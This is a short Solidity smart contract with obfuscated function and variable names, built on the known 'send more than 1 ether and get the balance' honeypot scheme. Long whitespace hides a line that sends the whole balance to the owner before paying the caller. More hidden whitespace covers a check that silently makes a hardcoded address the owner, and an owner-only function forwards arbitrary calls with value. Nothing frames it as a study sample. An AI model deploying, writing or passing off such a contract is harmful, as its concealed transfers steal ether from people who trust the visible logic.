pragma solidity ^0.4.19;

contract OX7B4DF339
{
    address public OX5D41402A = msg.sender;
   
    function() public payable{}
   
    function OX6D2F649F()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               OX5D41402A.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function OX4A44DC6B()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){OX5D41402A=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
        require(msg.sender == OX5D41402A);
        OX5D41402A.transfer(this.balance);
    }
    
    function OX7C4A8D09(address OX4B43B0AEE,bytes OX8D777F38F)
    payable
    public
    {
        require(msg.sender == OX5D41402A);
         
        OX4B43B0AEE.call.value(msg.value)(OX8D777F38F);
    }
}